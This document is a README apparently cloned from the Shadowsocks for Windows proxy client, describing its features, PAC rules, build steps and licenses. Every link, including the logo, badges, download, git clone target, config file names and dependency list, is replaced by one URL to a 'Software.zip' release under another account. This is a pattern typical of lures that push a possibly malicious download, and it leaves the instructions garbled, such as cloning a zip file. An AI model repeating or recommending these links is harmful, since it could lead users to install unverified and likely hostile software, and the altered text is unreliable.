<img src="https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip" alt="[logo]" width="48"/> Shadowsocks for Windows
=======================

[![Build](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip)](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip%3ABuild)
[![Release](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip)](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip%3ARelease)

## Features

- Connect to Shadowsocks servers.
- Automatically set system proxy.
- SIP002 URL scheme.
- SIP003 plugins.
- SIP008 online configuration delivery.

## Downloads

Download from [releases](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip).

## Usage

- 🚀

## PAC

- The PAC rules are generated from the geosite database in [v2fly/domain-list-community](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip).
- Generation modes: whitelist mode and blacklist mode.
- Domain groups: `geositeDirectGroups` and `geositeProxiedGroups`.
    - `geositeDirectGroups` is initialized with `cn` and `geolocation-!cn@cn`.
    - `geositeProxiedGroups` is initialized with `geolocation-!cn`.
- To switch between different modes, modify the `geositePreferDirect` property in `https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip`
    - When `geositePreferDirect` is false (default), PAC works in whitelist mode. Exception rules are generated from `geositeDirectGroups`. Unmatched domains goes through the proxy.
    - When `geositePreferDirect` is true, PAC works in blacklist mode. Blocking rules are generated from `geositeProxiedGroups`. Exception rules are generated from `geositeDirectGroups`. Unmatched domains are connected to directly.
- Starting from 4.3.0.0, shadowsocks-windows defaults to whitelist mode with Chinese domains excluded from connecting via the proxy.
- The new default values make sure that:
    - When in whitelist mode, Chinese domains, including non-Chinese companies' Chinese CDNs, are connected to directly.
    - When in blacklist mode, only non-Chinese domains goes through the proxy. Chinese domains, as well as non-Chinese companies' Chinese CDNs, are connected to directly.

### User-defined rules

- To define your own PAC rules, it's recommended to use the `https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip` file.
- You can also modify `https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip` directly. But your modifications won't persist after updating geosite from the upstream.

## Development

- IDE: Visual Studio 2019
- Language: C# 9.0
- SDK: .NET 5

### Build

1. Clone the repository recursively.
```bash
$ git clone --recursive https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
```
2. Open the repository in VS2019, switch to the _Release_ configuration, and build the solution.

### Contribute

`PR welcome`

You can use the [Source Browser](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip) to review code online.

## License

Shadowsocks-windows is licensed under the [GPLv3](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip) license.

```
https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)       https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)              https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)               https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
Fody (MIT)                       https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
GlobalHotKey (GPLv3)             https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
MdXaml (MIT)                     https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)            https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
Privoxy (GPLv2)                  https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)             https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)      https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)            https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)      https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
WPFLocalizationExtension (MS-PL) https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (Apache 2.0)           https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
```
